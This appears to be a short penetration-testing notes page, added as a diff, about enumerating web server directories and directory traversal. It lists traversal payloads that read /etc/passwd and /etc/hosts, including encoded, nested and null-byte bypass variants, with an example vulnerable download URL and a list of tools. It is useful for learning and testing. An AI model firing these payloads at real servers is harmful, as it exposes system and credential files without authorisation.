@@ -1,0 +1,48 @@
+# Enumerate webserver directories
+
+* `http-enum.nse` offers a quite extensive fingerprint, especially when including Nikto database, but there are 
+no guarantees all will be seen. 
+* Also try directory traversal.
+
+## Directory traversal
+
+```text
+1 Insert relative paths into existing files (OR)
+    1.1 ../../../etc/hosts
+    1.2 ../../../etc/passwd
+    1.3 ...
+2 Absolute path from the filesystem root to directly reference a file without using any traversal sequences (OR)
+    2.1 filename=/etc/hosts
+    2.2 filename=/etc/passwd
+    2.3 ...
+3 Nested traversal sequences which will revert to simple traversal sequences when the inner sequence is stripped (OR)
+    3.1 ....//
+    3.2 ....\/
+4 URL encoding the ../ characters (OR)
+    4.1 url encoding: %2e%2e%2f
+    4.2 double url encoding: %252e%252e%252f 
+5 Null byte bypass
+```
+
+### Simplest form
+
+Website has https://www.example.com/download_file.php?file=document.pdf
+
+Pass this as the file name:
+
+    ../../../etc/passwd
+
+If the application does not sanitize inputs, the string is used in a system call, switches to the root and then allows 
+access the `/etc/` directory and the protected passwd file.
+
+### Null byte bypass
+
+    filename=../../../etc/passwd%00.png
+
+## Tools
+
+* [Nmap](https://nmap.org)
+* [http-enum.nse](https://nmap.org/nsedoc/scripts/http-enum.html)
+* [FDSploit](https://github.com/chrispetrou/FDsploit)
+* Developer tools browser
+* [BurpSuite](https://portswigger.net/burp)
